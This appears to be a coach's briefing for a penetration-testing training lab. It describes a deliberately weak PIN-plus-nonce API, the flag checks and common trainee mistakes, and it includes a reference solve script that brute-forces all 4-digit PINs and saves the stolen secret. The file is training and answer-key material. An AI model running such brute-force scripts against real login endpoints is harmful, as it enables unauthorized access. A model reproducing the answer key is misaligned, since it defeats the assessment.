# Coach context — scr-t2-python-automation

## Target internals (api01:8080, flask)
- `GET /api/health` → `{"ok":true}`; `GET /api/nonce` → `{"nonce": N,
  "algo":"sha256(nonce + pin)"}` (nonce TTL 120s, single use)
- `POST /api/auth {"nonce":N,"pin":"4217","proof":sha256hex(N+"4217")}` →
  `{"token": T}` (TTL 300s). PIN is hardcoded 4217.
- `GET /api/secret` with `Authorization: Bearer T` → contents of
  /srv/api/secret.txt (the dynamic flag — file kind on api01).

## Flags
- file `api-secret` — the trainee submits the secret string.
- command `solve-script` (kali): `/root/solve.py` exists AND
  `/root/loot.txt` contains `pentrAIn{` — verifies the script saved it.

## Reference solve (do not hand out)
```python
import hashlib, requests
B = "http://10.x.10.20:8080"
s = requests.Session()
for pin in range(10000):
    n = s.get(f"{B}/api/nonce").json()["nonce"]
    p = f"{pin:04d}"
    proof = hashlib.sha256(f"{n}{p}".encode()).hexdigest()
    r = s.post(f"{B}/api/auth", json={"nonce": n, "pin": p, "proof": proof})
    if r.ok:
        tok = r.json()["token"]
        secret = s.get(f"{B}/api/secret",
                       headers={"Authorization": f"Bearer {tok}"}).text
        open("/root/loot.txt", "w").write(secret)
        break
```

## Coach guidance
- Common failures: reusing a nonce (single-use → 401 loop), hashing pin
  without the nonce, missing zero-padding (`"4217"` vs `"4217"` here but
  pins like 0042 need `:04d`), forgetting the Bearer prefix.
- If requests is "missing": kali has it; `pip` fallback exists but suggest
  urllib.request as stdlib alternative only if they insist.
- Watch brute-force order: some trainees try /api/auth without proof first
  — fine, let them read the 4xx bodies.
